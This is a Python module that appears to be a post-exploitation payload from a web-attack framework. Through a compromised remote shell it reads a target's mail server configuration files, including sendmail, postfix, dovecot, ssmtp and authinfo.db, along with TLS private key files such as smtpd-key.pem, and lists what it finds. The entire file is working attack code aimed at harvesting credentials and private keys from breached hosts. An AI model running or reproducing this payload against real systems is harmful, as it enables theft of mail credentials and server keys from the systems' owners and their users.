import re
from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table


class mail_config_files(base_payload):
    '''
    This payload shows mail configuration files
    '''
    def api_read(self, parameters):
        result = {}
        files = []

        files.append('/etc/mail/sendmail.cf')
        files.append('/etc/mail/sendmail.mc')
        files.append('/etc/sendmail.cf')
        files.append('/var/adm/sendmail/sendmail.cf')
        files.append('/etc/mail/submit.cf')
        files.append('/etc/postfix/main.cf')
        files.append('/etc/postfix/master.cf')
        files.append('/etc/ssmtp/ssmtp.conf')
        files.append('/etc/ssmtp/revaliases')
        files.append('/etc/mail/local-host-names')
        files.append('/etc/mail/access')
        files.append('/etc/mail/authinfo.db')
        files.append('/etc/imapd.conf')
        files.append('/etc/dovecot.conf')
        files.append('/etc/dovecot/dovecot.conf')
        files.append('/etc/mail/sendmail.mc')

        files.append('/usr/share/ssl/certs/dovecot.pem')
        files.append('/usr/share/ssl/private/dovecot.pem')
        files.append('/usr/share/ssl/certs/imapd.pem')
        files.append('/etc/postfix/ssl/smtpd.pem')
        files.append('/etc/postfix/ssl/smtpd-key.pem')


        for file in files:
            content = self.shell.read(file)
            if content:
                result[ file ] = content
        return result
        
    def run_read(self, parameters):
        api_result = self.api_read( parameters )
        
        if not api_result:
            return 'No mail configuration files were found.'
        else:
            rows = []
            rows.append( ['Mail configuration files'] ) 
            rows.append( [] )
            for filename in api_result:
                rows.append( [filename,] )
                
            result_table = table( rows )
            result_table.draw( 80 )                    
            return